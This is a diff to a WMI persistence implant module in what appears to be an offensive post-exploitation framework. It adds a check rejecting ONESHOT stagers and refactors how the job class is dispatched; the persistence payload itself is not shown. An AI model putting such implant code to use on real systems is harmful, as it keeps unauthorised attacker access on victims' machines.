@@ -4,6 +4,9 @@ import uuid
 
 class WMIPersistJob(core.job.Job):
     def create(self):
+        if self.session_id == -1:
+            self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error", "")
+            return False
         if self.session.elevated != 1:
             self.error("0", "This job requires an elevated session.", "Not elevated", "")
             return False
@@ -69,6 +72,9 @@ class WMIPersistImplant(core.implant.Implant):
         self.options.register("CLEANUP", "false", "will remove the created user", enum=["true", "false"])
         self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)
 
+    def job(self):
+        return WMIPersistJob
+
     def run(self):
         id = self.options.get("PAYLOAD")
         payload = self.load_payload(id)
@@ -82,4 +88,4 @@ class WMIPersistImplant(core.implant.Implant):
         payloads = {}
         payloads["js"] = self.loader.load_script("data/implant/persist/wmi.js", self.options)
 
-        self.dispatch(payloads, WMIPersistJob)
+        self.dispatch(payloads, self.job)
